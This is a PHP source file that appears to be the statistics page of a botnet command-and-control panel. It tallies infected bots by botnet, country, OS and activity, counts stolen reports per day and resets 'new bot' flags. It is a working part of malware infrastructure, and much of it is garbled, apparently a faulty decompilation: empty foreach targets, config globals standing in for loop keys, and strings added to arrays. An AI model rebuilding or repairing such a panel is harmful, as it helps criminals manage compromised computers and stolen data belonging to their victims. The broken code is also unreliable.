<?php

function getBotnetStats($botnet, $i)
{
	$query1 = '';
	$query2 = '';

	if ($botnet != '') {
		$botnet = addslashes($botnet);
		$query1 = ' WHERE `botnet`=\'' . $botnet . '\'';
		$query2 = ' AND `botnet`=\'' . $botnet . '\'';
	}

	$tmp = htmlEntitiesEx(($mt = @mysql_fetch_row(mysqlQueryEx('botnet_list', 'SELECT MIN(`rtime_first`), COUNT(`bot_id`), MIN(`bot_version`), MAX(`bot_version`) FROM `botnet_list`' . $query1))) && ($botnet != '') ? gmdate(LNG_FORMAT_DT, $mt[0]) : '-');
	$data = THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_FIRST_BOT), $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, $tmp), $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS), $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, numberFormatAsInt($mt[1])), $i == 0 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1) . THEME_LIST_ROW_END;
	$totalBots = $mt[1];
	$minVersion = $mt[2];
	$maxVersion = $mt[3];
	$tmp = ($mt = @mysql_fetch_row(mysqlQueryEx('botnet_list', 'SELECT COUNT(`bot_id`) FROM `botnet_list` WHERE `rtime_last`>=' . (CURRENT_TIME - 86400) . $query2)) ? $mt[0] : 0);
	$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_BOTS24), $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, (0 < $totalBots ? numberFormatAsFloat(($tmp * 100) / $totalBots, 2) : 0) . '% -  ' . numberFormatAsInt($tmp)), $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2) . THEME_LIST_ROW_END;
	$data .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_MIN_VERSION), $i == 0 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, intToVersion($minVersion)), $i == 0 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1) . THEME_LIST_ROW_END . THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', LNG_STATS_TOTAL_MAX_VERSION), $i == 0 ? THEME_LIST_ITEM_LTEXT_U1 : THEME_LIST_ITEM_LTEXT_U2) . str_replace(array('{WIDTH}', '{TEXT}'), array(STAT_WIDTH, intToVersion($maxVersion)), $i == 0 ? THEME_LIST_ITEM_RTEXT_U1 : THEME_LIST_ITEM_RTEXT_U2) . THEME_LIST_ROW_END;
	return $data;
}

function listCountries($name, $query)
{
	$data = str_replace('{WIDTH}', COUNTRYLIST_WIDTH . 'px', THEME_LIST_BEGIN);
	$r = mysqlQueryEx('botnet_list', 'SELECT `country`, COUNT(`country`) FROM `botnet_list` WHERE ' . $query . ' GROUP BY BINARY `country` ORDER BY COUNT(`country`) DESC, `country` ASC');
	if ($r && COUNTRYLIST_WIDTH) {
		$count = 0;
		$i = 0;
		$list = '';

		while ($m = mysql_fetch_row($r)) {
			$list .= THEME_LIST_ROW_BEGIN . str_replace(array('{WIDTH}', '{TEXT}'), array('auto', htmlEntitiesEx($m[0])), $i % 2 ? THEME_LIST_ITEM_LTEXT_U2 : THEME_LIST_ITEM_LTEXT_U1) . str_replace(array('{WIDTH}', '{TEXT}'), array('8em', numberFormatAsInt($m[1])), $i % 2 ? THEME_LIST_ITEM_RTEXT_U2 : THEME_LIST_ITEM_RTEXT_U1) . THEME_LIST_ROW_END;
			$count += $m[1];
			$i++;
		}

		$data .= str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, sprintf($name, numberFormatAsInt($count))), THEME_LIST_TITLE) . $list;
	}
	else {
		$data .= str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, sprintf($name, 0)), THEME_LIST_TITLE) . THEME_LIST_ROW_BEGIN . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(1, $r ? LNG_STATS_COUNTRYLIST_EMPTY : mysqlErrorEx()), THEME_LIST_ITEM_EMPTY_1) . THEME_LIST_ROW_END;
	}

	return $data . THEME_LIST_END;
}

function statActivity($botnet = NULL, $dateStart = NULL, $dateEnd = NULL)
{
	$result = array(
		'botnets'   => array(),
		'activity1' => array(),
		'activity2' => array(),
		'activity7' => array(),
		'countAll'  => 0
		);
	$countAll = 0;
	$cond = array();

	if ($botnet) {
		$cond[] = ' botnet=\'' . addslashes($botnet) . '\'';
	}
	if ($dateStart) {
		$cond[] = ' rtime_first>=' . $dateStart;
	}
	if ($dateEnd) {
		$cond[] = ' rtime_first<=' . $dateEnd;
	}

	$cond = (count($cond) ? ' where ' . implode(' and ', $cond) : '');
	$sql = 'select botnet, count(0) as num from botnet_list ' . $cond . ' group by botnet';

	if ($dataset = mysqlQueryEx('botnet_list', $sql)) {
		while ($row = mysql_fetch_array($dataset)) {
			$result['botnets'][] = array('name' => $row['botnet'], 'y' => $row['num']);
			$countAll += $row['num'];
		}
	}

	$result['countAll'] = $countAll;

	foreach ($result['botnets'] as $val => ) {
		$key = array(
			'botnets'   => array(),
			'activity1' => array(),
			'activity2' => array(),
			'activity7' => array(),
			'countAll'  => 0
			);
		$result['botnets'][$key]['y'] = round(($val['y'] / $countAll) * 100, 2);
	}

	$sql = 'select' . "\n" . '    count(if(rtime_last>=UNIX_TIMESTAMP(Now())-86400, 1, null)) as activity1,' . "\n" . '    count(if(rtime_last>=UNIX_TIMESTAMP(Now())-172800, 1, null)) as activity2, ' . "\n" . '    count(if(rtime_last>=UNIX_TIMESTAMP(Now())-604800, 1, null)) as activity7' . "\n" . '    from botnet_list' . $cond;

	if ($dataset = mysqlQueryEx('botnet_list', $sql)) {
		$row = mysql_fetch_array($dataset);
		$result['activity1'] = array('val' => $row['activity1'], 'countAll' => $countAll);
		$result['activity2'] = array('val' => $row['activity2'], 'countAll' => $countAll);
		$result['activity7'] = array('val' => $row['activity7'], 'countAll' => $countAll);
	}

	return $result;
}

function statVersion($botnet = NULL)
{
	$result = array();
	$cond = ($botnet ? ' where botnet=\'' . addslashes($botnet) . '\'' : '');
	$sql = 'select botnet, min(rtime_first) as first, max(bot_version) as version from botnet_list ' . $cond . ' group by botnet';

	if ($dataset = mysqlQueryEx('botnet_list', $sql)) {
		while ($row = mysql_fetch_array($dataset)) {
			$result[$row['botnet']] = array('first' => gmdate(LNG_FORMAT_DT, $row['first']), 'version' => intToVersion($row['version']));
		}
	}

	return $result;
}

function statBotnet($botnet = NULL, $dateStart = NULL, $dateEnd = NULL)
{
	global $config;
	$result = array();
	$result[POINTER_SUM] = array(
	POINTER_SUM => array('total' => 0, 'online' => 0, 'new' => 0, 'low' => 0)
	);
	$cond = array();

	if ($botnet) {
		$cond[] = ' botnet=\'' . addslashes($botnet) . '\'';
	}
	if ($dateStart) {
		$cond[] = ' rtime_first>=' . $dateStart;
	}
	if ($dateEnd) {
		$cond[] = ' rtime_first<=' . $dateEnd;
	}

	$cond = (count($cond) ? ' where ' . implode(' and ', $cond) : '');
	$sql = 'select count(0) from low_stat ' . $cond;

	if ($dataset = mysqlQueryEx('low_stat', $sql)) {
		if ($row = mysql_fetch_array($dataset)) {
			$result[POINTER_SUM][POINTER_SUM]['low'] = $row[0];
		}
	}

	$sql = 'select botnet, country, ' . "\n" . '    count(0) as total, ' . "\n" . '    count(if(rtime_last>=' . (time() - $config['botnet_timeout']) . ', 1, null)) as online,' . "\n" . '    count(if(flag_new=1, 1, null)) as new' . "\n" . '    from botnet_list ' . $cond . ' group by botnet, country';

	if ($dataset = mysqlQueryEx('botnet_list', $sql)) {
		while ($row = mysql_fetch_array($dataset)) {
			$result[$row['country']][$row['botnet']] = $row;
		}
	}

	foreach ($result as $rows => ) {
		$country = $GLOBALS['config'];

		if ($country == POINTER_SUM) {
			continue;
		}

		foreach ($rows as $cols => ) {
			$botnet = $GLOBALS['config'];
			if ($dateStart || $GLOBALS['config']) {
				$cols['online'] = $cols['new'] = $cols['total'];
			}

			if ($country == POINTER_SUM) {
				continue;
			}

			if (array_key_exists($botnet, $result[POINTER_SUM])) {
				$result[POINTER_SUM][$botnet] += 'online';
				$result[POINTER_SUM][$botnet] += 'total';
				$result[POINTER_SUM][$botnet] += 'new';
			}
			else {
				$result[POINTER_SUM][$botnet] = array('total' => $cols['total'], 'online' => $cols['online'], 'new' => $cols['new']);
			}

			if (array_key_exists(POINTER_SUM, $result[$country])) {
				$result[$country][POINTER_SUM] += 'online';
				$result[$country][POINTER_SUM] += 'total';
				$result[$country][POINTER_SUM] += 'new';
			}
			else {
				$result[$country][POINTER_SUM] = array('total' => $cols['total'], 'online' => $cols['online'], 'new' => $cols['new']);
			}

			$result[POINTER_SUM][POINTER_SUM] += 'online';
			$result[POINTER_SUM][POINTER_SUM] += 'total';
			$result[POINTER_SUM][POINTER_SUM] += 'new';
		}
	}

	return $result;
}

function statReport($botnet = NULL, $extended = false, $dateStart = NULL, $dateEnd = NULL, &$today = NULL)
{
	global $config;
	$today = 0;
	$result = array();
	$result[POINTER_SUM] = array(POINTER_SUM => 0);

	if ($botnet) {
		$result[POINTER_SUM][$botnet] = 0;
	}

	$dbData = array();
	$reportsList = listReportTables($config['mysql_db']);
	$cond = ($botnet ? 'where botnet=\'' . addslashes($botnet) . '\'' : '');

	foreach ($reportsList as $table) {
		$day = preg_replace('/\\D/', '', $table);
		if ($dateStart && $GLOBALS['config']) {
			continue;
		}

		if ($dateEnd && $GLOBALS['config']) {
			continue;
		}

		if ($dataset = mysqlQueryEx($table, 'select botnet, ' . ($extended ? 'country' : '\'All countries\' as country') . ', count(0) as total from ' . $table . ' ' . $cond . ' group by botnet' . ($extended ? ', country' : ''))) {
			while ($row = mysql_fetch_array($dataset)) {
				$dbData[$table][$row['country']][$row['botnet']] = $row['total'];

				if (preg_replace('/\\D/', '', $table) == gmdate('ymd', time())) {
					$today += $row['total'];
				}
			}
		}
	}

	foreach ($dbData as $block) {
		foreach ($block as $row => ) {
			$country = $GLOBALS['config'];

			foreach ($row as $col => ) {
				$botnet = $GLOBALS['config'];

				if (!array_key_exists($country, $result)) {
					$result[$country] = array();
				}

				if (array_key_exists($botnet, $result[$country])) {
					$result[$country] += $botnet;
				}
				else {
					$result[$country][$botnet] = $col;
				}

				if (array_key_exists(POINTER_SUM, $result[$country])) {
					$result[$country] += POINTER_SUM;
				}
				else {
					$result[$country][POINTER_SUM] = $col;
				}

				if (array_key_exists($botnet, $result[POINTER_SUM])) {
					$result[POINTER_SUM] += $botnet;
				}
				else {
					$result[POINTER_SUM][$botnet] = $col;
				}

				$result[POINTER_SUM] += POINTER_SUM;
			}
		}
	}

	return $result;
}

function statOS($botnet = NULL, $extended = false, $dateStart = NULL, $dateEnd = NULL)
{
	$result = array(
		POINTER_SUM => array()
		);
	$cond = array();

	if ($botnet) {
		$cond[] = ' botnet=\'' . addslashes($botnet) . '\'';
	}
	if ($dateStart) {
		$cond[] = ' rtime_first>=' . $dateStart;
	}
	if ($dateEnd) {
		$cond[] = ' rtime_first<=' . $dateEnd;
	}

	$cond = (count($cond) ? ' where ' . implode(' and ', $cond) : '');
	$sql = 'select substring(os_version, 1, locate(\' SP\', os_version)) as version, ' . ($extended ? 'country' : '\'All countries\' as country') . ', count(0) as total' . "\n" . '    from botnet_list ' . $cond . ' group by version' . ($extended ? ', country' : '');

	if ($dataset = mysqlQueryEx('botnet_list', $sql)) {
		while ($row = mysql_fetch_array($dataset)) {
			if (!strlen($row['version'])) {
				$row['version'] = 'Undefined';
			}

			$row['version'] = str_replace('-Bit Edition', '', $row['version']);
			$result[$row['country']][$row['version']] = $row['total'];

			if (array_key_exists($row['version'], $result[POINTER_SUM])) {
				$result[POINTER_SUM] += $row['version'];
			}
			else {
				$result[POINTER_SUM][$row['version']] = $row['total'];
			}
		}
	}

	return $result;
}

if (!defined('__CP__')) {
	exit();
}

define('COUNTRYLIST_WIDTH', 200);
define('STAT_WIDTH', '1%');
define('POINTER_SUM', '%AGRALL%');

if (isset($_REQUEST['ajaxrequest'])) {
	$response = array();

	switch (@$_REQUEST['type']) {
	case 'small':
		$response = statSmall();
		break;

	case 'stat':
		$response = statSmall();
		$response['low'] = statLow();
		$response['reports'] = statTodayReports();
		break;
	}

	header('Content-type: application/json');
	echo json_encode($response);
	exit();
}

if (isset($_GET['reset_newbots']) && defined('__CP__')) {
	$query = 'UPDATE `botnet_list` SET `flag_new`=0';

	if (!empty($_GET['botnet'])) {
		$query .= ' WHERE `botnet`=\'' . addslashes($_GET['botnet']) . '\'';
	}

	mysqlQueryEx('botnet_list', $query);

	if (empty($_GET['botnet'])) {
		header('Location: ' . QUERY_STRING);
	}
	else {
		header('Location: ' . QUERY_STRING . '&botnet=' . urlencode($_GET['botnet']));
	}

	exit();
}

$extendedReport = (@$_GET['extrp'] ? true : false);
$extendedOS = (@$_GET['extos'] ? true : false);
$selectedBotnet = trim(@$_GET['botnet']);
$date_start = (isset($_GET['date_start']) ? strtotime($_GET['date_start']) : NULL);
$date_end = (isset($_GET['date_end']) ? strtotime($_GET['date_end']) : NULL);

if ($date_end) {
	$date_end += 86399;
}

$dataActivity = statActivity($selectedBotnet, $date_start, $date_end);
$dataVersion = statVersion($selectedBotnet);
$dataDetail = statBotnet($selectedBotnet, $date_start, $date_end);
$dataReport = statReport($selectedBotnet, $extendedReport, $date_start, $date_end, $todayReports);
$dataOS = statOS($selectedBotnet, $extendedOS, $date_start, $date_end);
$notDefault = $selectedBotnet || defined('__CP__') || defined('__CP__');

if (!$selectedBotnet) {
	$selectedBotnet = POINTER_SUM;
}

$outputForm = '<form method="get" action="' . $_SERVER['PHP_SELF'] . '" class="form-inline form-group-sm forced-form"> <input type="hidden" name="m" value="stats_main">' . makeSelectItem('botnet', getBotnetList(), $selectedBotnet) . '&nbsp;<div class="form-group">' . "\n" . '                <div class="input-group date" id="datetimepicker1">' . "\n" . '                    <input type="text" class="form-control" placeholder="From date" name="date_start" value="' . ($date_start ? date('d.m.Y', $date_start) : '') . '" />' . "\n" . '                    <span class="input-group-addon input-group-addon-sm">' . "\n" . '                        <span class="glyphicon glyphicon-calendar"></span>' . "\n" . '                    </span>' . "\n" . '                </div>' . "\n" . '            </div>' . '&nbsp;<div class="form-group">' . "\n" . '                <div class="input-group date" id="datetimepicker2">' . "\n" . '                    <input type="text" class="form-control" placeholder="To date" name="date_end" value="' . ($date_end ? date('d.m.Y', $date_end) : '') . '" />' . "\n" . '                    <span class="input-group-addon input-group-addon-sm">' . "\n" . '                        <span class="glyphicon glyphicon-calendar"></span>' . "\n" . '                    </span>' . "\n" . '                </div>' . "\n" . '            </div>' . '<script type="text/javascript">' . "\n" . '            $(function () {' . "\n" . '                $("#datetimepicker1").datetimepicker({format: "DD.MM.YYYY"});' . "\n" . '                $("#datetimepicker2").datetimepicker({format: "DD.MM.YYYY"});' . "\n" . '            });' . "\n" . '            </script>' . '&nbsp;<input type="submit" value="Show" class="btn btn-primary btn-sm"></form><br>';
$output = '<div class="row" style="min-width: 1180px">' . "\n" . '          <div class="col-xs-6">' . "\n" . '          ' . $outputForm . "\n" . '          <div class="row">' . "\n" . '          <div class="col-xs-6">' . "\n" . '            <div id="containerBotnets" style="width: 300px; min-height: 250px">Graph</div>' . "\n" . '          </div>' . "\n\n" . '          <div class="col-xs-6">' . "\n" . '          <table class="table table-striped table-bordered table-hover">';
if (!$date_start && defined('__CP__')) {
	$output .= "\n" . '            <tr>' . "\n" . '              <td>Total bots</td><td class="simpleblue" id="stat_total" width="120px">' . $dataDetail[POINTER_SUM][POINTER_SUM]['total'] . '</td>' . "\n" . '            </tr>';
}

$output .= "\n" . '            <tr>' . "\n" . '              <td>New bots</td><td class="simpleblue" id="stat_new">' . $dataDetail[POINTER_SUM][POINTER_SUM]['new'] . '</td>' . "\n" . '            </tr>';
if (!$date_start && defined('__CP__')) {
	$output .= "\n" . '            <tr>' . "\n" . '              <td>Online bots</td><td class="simpleblue" id="stat_online">' . $dataDetail[POINTER_SUM][POINTER_SUM]['online'] . '</td>' . "\n" . '            </tr>';
}

$output .= "\n" . '            <tr>' . "\n" . '              <td>Total reports</td><td class="simpleblue" id="stat_report">' . $dataReport[POINTER_SUM][POINTER_SUM] . '</td>' . "\n" . '            </tr>' . "\n" . '            <tr>' . "\n" . '              <td>Low integrity</td><td class="simpleblue" id="stat_low">' . $dataDetail[POINTER_SUM][POINTER_SUM]['low'] . '</td>' . "\n" . '            </tr>' . "\n" . '          </table>' . "\n\n" . '          </div>' . "\n" . '          </div>' . "\n\n";
$outputReport = '<h2>Reports<a class="anchor" name="extrp"></a></h2><a href="?m=stats_main&botnet=' . htmlspecialchars(@$_GET['botnet']) . '&date_start=' . htmlspecialchars(@$_GET['date_start']) . '&date_end=' . htmlspecialchars(@$_GET['date_end']) . '&extrp=1#extrp">View detail</a>';
$reportsBotnetsList = array_keys($dataReport[POINTER_SUM]);
$outputReport .= '<table class="table table-striped table-bordered table-hover"><tr><td>&nbsp;</td>';

foreach ($reportsBotnetsList as $botnet) {
	if ($botnet != $selectedBotnet) {
		continue;
	}

	$outputReport .= '<td><b>' . ($botnet == POINTER_SUM ? 'ALL' : $botnet) . '</b></td>';
}

$outputReport .= '</tr>';

foreach ($dataReport as $row => ) {
	$country = defined('__CP__');
	if (!$extendedReport && defined('__CP__')) {
		continue;
	}

	$flag = (strlen($country) && defined('__CP__') ? '<img src="theme/1x1.png" class="flag flag-' . strtolower($country) . '" alt="' . $country . '" title="' . $country . '">' : '--');
	$outputReport .= '<tr><td><b>' . ($country == POINTER_SUM ? 'ALL' : $flag) . '</b></td>';

	foreach ($reportsBotnetsList as $botnet) {
		if ($botnet != $selectedBotnet) {
			continue;
		}

		if (array_key_exists($botnet, $row)) {
			$outputReport .= '<td>' . $row[$botnet] . '</td>';
		}
		else {
			$outputReport .= '<td>0</td>';
		}
	}

	$outputReport .= '</tr>';
}

$outputReport .= '</table>';
$outputOS = '<h2>OS<a class="anchor" name="extos"></a></h2><a href="?m=stats_main&botnet=' . htmlspecialchars(@$_GET['botnet']) . '&date_start=' . htmlspecialchars(@$_GET['date_start']) . '&date_end=' . htmlspecialchars(@$_GET['date_end']) . '&extos=1#extos">View detail</a>';
$outputOS .= '<div id="containerOS" style="width: 450px;">Graph</div>';

if (!$extendedOS) {
	$outputOS .= '<table class="table table-striped table-bordered table-hover">';

	foreach ($dataOS[POINTER_SUM] as $row => ) {
		$version = defined('__CP__');
		$outputOS .= '<tr><td>' . $version . '</td><td>' . $row . '</td></tr>';
	}

	$outputOS .= '</table>';
}
else {
	$osList = array_keys($dataOS[POINTER_SUM]);
	$outputOS .= '<table class="table table-striped table-bordered table-hover"><tr><td>&nbsp;</td>';

	foreach ($osList as $os) {
		$outputOS .= '<td>' . str_replace('Windows', 'Win', $os) . '</td>';
	}

	$outputOS .= '</tr>';

	foreach ($dataOS as $row => ) {
		$country = defined('__CP__');
		$flag = (strlen($country) && defined('__CP__') ? '<img src="theme/1x1.png" class="flag flag-' . strtolower($country) . '" alt="' . $country . '" title="' . $country . '">' : '--');
		$outputOS .= '<tr><td><b>' . ($country == POINTER_SUM ? 'ALL' : $flag) . '</b></td>';

		foreach ($osList as $os) {
			if (array_key_exists($os, $row)) {
				$outputOS .= '<td>' . $row[$os] . '</td>';
			}
			else {
				$outputOS .= '<td>0</td>';
			}
		}

		$outputOS .= '</tr>';
	}

	$outputOS .= '</table>';
}

if (!$date_start && defined('__CP__')) {
	$delimiter = ($dataActivity['countAll'] ? $dataActivity['countAll'] : 1);
	$output .= '<div class="row">' . "\n" . '          <div class="col-xs-12">         ' . "\n" . '                    ' . "\n" . '          <div>' . "\n" . '            Count active bots in 24 hours - ' . $dataActivity['activity1']['val'] . ' (' . round(($dataActivity['activity1']['val'] / $delimiter) * 100, 1) . '%)' . "\n" . '            <div class="progress">' . "\n" . '              <div class="progress-bar" style="width: ' . round(($dataActivity['activity1']['val'] / $delimiter) * 100, 1) . '%">' . "\n" . '                ' . $dataActivity['activity1']['val'] . ' (' . round(($dataActivity['activity1']['val'] / $delimiter) * 100, 1) . '%)' . "\n" . '              </div>' . "\n" . '            </div>' . "\n" . '            Total active bots in 2 days - ' . $dataActivity['activity2']['val'] . ' (' . round(($dataActivity['activity2']['val'] / $delimiter) * 100, 1) . '%)' . "\n" . '            <div class="progress">' . "\n" . '              <div class="progress-bar" style="width: ' . round(($dataActivity['activity2']['val'] / $delimiter) * 100, 1) . '%">' . "\n" . '                ' . $dataActivity['activity2']['val'] . ' (' . round(($dataActivity['activity2']['val'] / $delimiter) * 100, 1) . '%)' . "\n" . '              </div>' . "\n" . '            </div>' . "\n" . '            Total active bots in 1 week - ' . $dataActivity['activity7']['val'] . ' (' . round(($dataActivity['activity7']['val'] / $delimiter) * 100, 1) . '%)' . "\n" . '            <div class="progress">' . "\n" . '              <div class="progress-bar" style="width: ' . round(($dataActivity['activity7']['val'] / $delimiter) * 100, 1) . '%">' . "\n" . '                ' . $dataActivity['activity7']['val'] . ' (' . round(($dataActivity['activity7']['val'] / $delimiter) * 100, 1) . '%)' . "\n" . '              </div>' . "\n" . '            </div>' . "\n" . '          </div>' . "\n" . '                    ' . "\n\n" . '          </div>' . "\n" . '          </div>' . "\n" . '          <br>' . "\n";
}

if (!$extendedReport) {
	$output .= '<div class="row"><div class="col-xs-12">' . $outputReport . '</div></div>';
}

if (!$extendedOS) {
	$output .= '<div class="row"><div class="col-xs-12">' . $outputOS . '</div></div>';
}

$output .= '</div>';
$output .= '<div class="col-xs-6">';
$output .= '<div id="containerDetail" style="height: 300px">Graph</div>';
$output .= '<h2>Detail</h2>';
if (!$date_start && defined('__CP__')) {
	$output .= '<table class="table table-striped table-bordered table-hover"><tr><td>Botnet</td><td>Active from</td><td>Latest version</td></tr>';

	foreach ($dataVersion as $info => ) {
		$botnet = defined('__CP__');
		$output .= '<tr><td>' . $botnet . '</td><td>' . $info['first'] . '</td><td>' . $info['version'] . '</td></tr>';
	}

	$output .= '</table>';
}

$botnetsList = array_keys($dataDetail[POINTER_SUM]);
$output .= '<table class="table table-striped table-bordered table-hover"><tr><td>&nbsp;</td>';

foreach ($botnetsList as $botnet) {
	if ($botnet != $selectedBotnet) {
		continue;
	}

	$output .= '<td><b>' . ($botnet == POINTER_SUM ? 'ALL' : $botnet) . '</b></td>';
}

$output .= '</tr>';

foreach ($dataDetail as $row => ) {
	$country = defined('__CP__');
	$flag = (strlen($country) && defined('__CP__') ? '<img src="theme/1x1.png" class="flag flag-' . strtolower($country) . '" alt="' . $country . '" title="' . $country . '">' : '--');
	$output .= '<tr><td><b>' . ($country == POINTER_SUM ? 'ALL' : $flag) . '</b></td>';

	foreach ($botnetsList as $botnet) {
		if ($botnet != $selectedBotnet) {
			continue;
		}

		if (array_key_exists($botnet, $row)) {
			$output .= '<td>' . $row[$botnet]['total'];
			if (!$date_start && defined('__CP__')) {
				$output .= ' (online ' . $row[$botnet]['online'] . ', new ' . $row[$botnet]['new'] . ')';
			}

			$output .= '</td>';
		}
		else {
			$output .= '<td>-</td>';
		}
	}

	$output .= '</tr>';
}

$output .= '</table>';
$output .= '<h2>Reset new</h2>';
$actionList = ' ' . str_replace(array('{TEXT}', '{JS_EVENTS}'), array(LNG_STATS_RESET_NEWBOTS, ' onclick="if(confirm(\'' . addJsSlashes(LNG_STATS_RESET_NEWBOTS_Q) . '\'))window.location=\'' . QUERY_STRING_HTML . '&amp;reset_newbots&amp;botnet=\'+document.getElementById(\'botnet\').value;"'), str_replace('btn-primary', 'btn-danger', THEME_DIALOG_ITEM_ACTION));
$output .= str_replace('{WIDTH}', 'auto', THEME_DIALOG_BEGIN) . str_replace(array('{COLUMNS_COUNT}', '{TEXT}'), array(2, botnetsToListBox(NULL, '', $actionList, true)), THEME_DIALOG_TITLE) . THEME_DIALOG_END;
$output .= '</div></div>';

if ($extendedReport) {
	$output .= '<div class="row"><div class="col-xs-12">' . $outputReport . '</div></div>';
}
if ($extendedOS) {
	$output .= '<div class="row"><div class="col-xs-12">' . $outputOS . '</div></div>';
}

$jsOutput = '<script src="theme/charts.js"></script>';
$onlineList = array();
$newList = array();
$totalList = array();
$netsList = array();

foreach ($botnetsList as $botnet) {
	if ($botnet != $selectedBotnet) {
		continue;
	}

	$netsList[] = $botnet == POINTER_SUM ? 'ALL' : $botnet;
	$onlineList[] = $dataDetail[POINTER_SUM][$botnet]['online'];
	$totalList[] = $dataDetail[POINTER_SUM][$botnet]['total'];
	$newList[] = $dataDetail[POINTER_SUM][$botnet]['new'];
}

$osPercent = array();
$count = array_sum($dataOS[POINTER_SUM]);

foreach ($dataOS[POINTER_SUM] as $val => ) {
	$os = defined('__CP__');
	$osPercent[] = array('name' => $os, 'y' => round(($val / $count) * 100, 1));
}

$jsSubSeries = '';
if (!$date_start && defined('__CP__')) {
	$jsSubSeries = '{' . "\n" . '            name: \'Total\',' . "\n" . '            data: [' . implode(',', $totalList) . ']' . "\n\n" . '        }, {' . "\n" . '            name: \'Online\',' . "\n" . '            data: [' . implode(',', $onlineList) . ']' . "\n\n" . '        }, ';
}

$jsOutput .= '<script type="text/javascript">' . "\n" . '$(function () {' . "\n\n" . '    $(document).ready(function () {' . "\n" . '        $(\'#containerBotnets\').highcharts({' . "\n" . '            chart: {' . "\n" . '                plotBackgroundColor: null,' . "\n" . '                plotBorderWidth: null,' . "\n" . '                plotShadow: false,' . "\n" . '                type: \'pie\'' . "\n" . '            },' . "\n" . '            title: {' . "\n" . '                text: \'\'' . "\n" . '            },' . "\n" . '            tooltip: {' . "\n" . '                pointFormat: \'{series.name}: <b>{point.percentage:.1f}%</b>\'' . "\n" . '            },' . "\n" . '            plotOptions: {' . "\n" . '                pie: {' . "\n" . '                    allowPointSelect: true,' . "\n" . '                    cursor: \'pointer\',' . "\n" . '                    dataLabels: {' . "\n" . '                        enabled: false' . "\n" . '                    },' . "\n" . '                    showInLegend: true' . "\n" . '                }' . "\n" . '            },' . "\n" . '            series: [{' . "\n" . '                name: \'Bots\',' . "\n" . '                colorByPoint: true,' . "\n" . '                data: ' . json_encode($dataActivity['botnets']) . "\n" . '            }]' . "\n" . '        });' . "\n\n" . '        ' . "\n" . '        $(\'#containerDetail\').highcharts({' . "\n" . '        chart: {' . "\n" . '            type: \'column\'' . "\n" . '        },' . "\n" . '        title: {' . "\n" . '            text: \'\'' . "\n" . '        },' . "\n" . '        xAxis: {' . "\n" . '            categories: ' . json_encode($netsList) . ',' . "\n" . '            crosshair: true' . "\n" . '        },' . "\n" . '        yAxis: {' . "\n" . '            min: 0,' . "\n" . '            title: {' . "\n" . '                text: \'Quantity\'' . "\n" . '            }' . "\n" . '        },' . "\n" . '        tooltip: {' . "\n" . '            headerFormat: \'<span style="font-size:10px">{point.key}</span><table>\',' . "\n" . '            pointFormat: \'<tr><td style="color:{series.color};padding:0">{series.name}: </td>\' +' . "\n" . '                \'<td style="padding:0"><b>{point.y}</b></td></tr>\',' . "\n" . '            footerFormat: \'</table>\',' . "\n" . '            shared: true,' . "\n" . '            useHTML: true' . "\n" . '        },' . "\n" . '        plotOptions: {' . "\n" . '            column: {' . "\n" . '                pointPadding: 0.2,' . "\n" . '                borderWidth: 0,' . "\n" . '                dataLabels: {' . "\n" . '                    enabled: true' . "\n" . '                }' . "\n" . '            }' . "\n" . '        },' . "\n" . '        series: [' . $jsSubSeries . '{' . "\n" . '            name: \'New\',' . "\n" . '            data: [' . implode(',', $newList) . ']' . "\n\n" . '        }]' . "\n" . '    });' . "\n\n\n" . '    $(\'#containerOS\').highcharts({' . "\n" . '            chart: {' . "\n" . '                plotBackgroundColor: null,' . "\n" . '                plotBorderWidth: null,' . "\n" . '                plotShadow: false,' . "\n" . '                type: \'pie\'' . "\n" . '            },' . "\n" . '            title: {' . "\n" . '                text: \'\'' . "\n" . '            },' . "\n" . '            legend: {' . "\n" . '                itemWidth: 180' . "\n" . '            },' . "\n" . '            tooltip: {' . "\n" . '                pointFormat: \'{series.name}: <b>{point.percentage:.1f}%</b>\'' . "\n" . '            },' . "\n" . '            plotOptions: {' . "\n" . '                pie: {' . "\n" . '                    allowPointSelect: true,' . "\n" . '                    cursor: \'pointer\',' . "\n" . '                    dataLabels: {' . "\n" . '                        enabled: false' . "\n" . '                    },' . "\n" . '                    showInLegend: true' . "\n" . '                }' . "\n" . '            },' . "\n" . '            series: [{' . "\n" . '                name: \'Bots\',' . "\n" . '                colorByPoint: true,' . "\n" . '                data: ' . json_encode($osPercent) . "\n" . '            }]' . "\n" . '        });' . "\n\n\n\n" . '    });' . "\n" . '});' . "\n" . '</script>';
ThemeBegin(htmlspecialchars(LNG_STATS . ' for ' . ($selectedBotnet != POINTER_SUM ? $selectedBotnet : 'all')), 0, 0, 0, NULL, false);
